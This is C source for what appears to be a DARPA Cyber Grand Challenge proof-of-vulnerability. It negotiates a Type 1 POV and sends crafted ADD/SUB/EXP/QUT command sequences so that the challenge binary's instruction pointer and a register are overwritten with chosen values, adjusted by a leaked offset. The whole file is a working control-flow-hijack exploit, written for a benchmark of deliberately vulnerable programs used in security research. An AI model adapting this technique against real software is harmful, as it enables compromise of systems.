#include "libpov.h"

char* cgc_itoa(unsigned int i)
{
  static char buf[32];
  char *p = buf + 31;
  do {
    *--p = '0' + (i % 10);
    i /= 10;
  } while (i != 0);
  return p;
}

#define CMD_ADD 0x903C5CE4UL
#define CMD_SUB 0xC66AC07FUL
#define CMD_EXP 0xAE22983DUL
#define CMD_QUT 0x7DA7BAE3UL

int main(int cgc_argc, char *cgc_argv[])
{
  unsigned int i;
  unsigned char payload[4096], output[4096];
  int arg1, arg2;
  cgc_size_t pay_len = 0;
  type1_vals t1;
  cgc_type1_negotiate(0xfefefefe, 0xfefefefe, 5, &t1);

  /* Read offset */
  cgc_length_read(STDIN, output, 2);
  short rslr = *(short *)output;

  /* Write n */
  i = 42;
  cgc_transmit_all(STDOUT, &i, sizeof(unsigned int));

  /* Fill */
  cgc_memset(payload, 0, sizeof(payload));
  for (i = 0; i < 38; ++i)
  {
    cgc_random(&arg1, sizeof(int), NULL);
    *(unsigned int *)&payload[pay_len] = CMD_SUB; pay_len += sizeof(unsigned int);
    *(int *)&payload[pay_len] = arg1 - rslr; pay_len += sizeof(int);
    *(int *)&payload[pay_len] = arg1; pay_len += sizeof(int);
  }
  for (i = 0;  i < 3; ++i)
  {
    arg1 = t1.regval & 0xFFFF0000;
    arg2 = t1.regval & 0x0000FFFF;
    *(unsigned int *)&payload[pay_len] = CMD_ADD; pay_len += sizeof(unsigned int);
    *(int *)&payload[pay_len] = arg1 - rslr; pay_len += sizeof(int);
    *(int *)&payload[pay_len] = arg2; pay_len += sizeof(int);
  }
  arg1 = t1.ipval & 0xFFFF0000;
  arg2 = t1.ipval & 0x0000FFFF;
  *(unsigned int *)&payload[pay_len] = CMD_ADD; pay_len += sizeof(unsigned int);
  *(int *)&payload[pay_len] = arg1 - rslr; pay_len += sizeof(int);
  *(int *)&payload[pay_len] = arg2; pay_len += sizeof(int);

  *(unsigned int *)&payload[pay_len] = CMD_EXP; pay_len += sizeof(unsigned int);
  *(unsigned int *)&payload[pay_len] = CMD_QUT; pay_len += sizeof(unsigned int);

  cgc_transmit_all(STDOUT, payload, pay_len);
  cgc_length_read(STDIN, output, 1);

  return 0;
}
